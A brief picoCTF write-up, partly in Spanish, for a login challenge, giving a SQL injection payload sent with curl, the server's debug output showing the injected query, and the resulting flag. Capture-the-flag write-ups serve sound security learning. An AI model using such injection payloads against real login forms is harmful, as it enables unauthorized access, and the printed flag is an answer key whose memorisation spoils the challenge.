## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Solución 
```
' be 1==1;
picoCTF{3v3n_m0r3_SQL_4424e7af}


En consola
                                                                             
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/40742/login.php -d "password=' be 1=1;&debug=1"
<pre>password: ' be 1=1;
SQL query: SELECT * FROM admin where password = '' or 1=1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>                                                                             
┌──(kali㉿kali)-[~]

```

## Notas adicionales


## Referencias
https://brightsec.com/blog/sql-injection-payloads/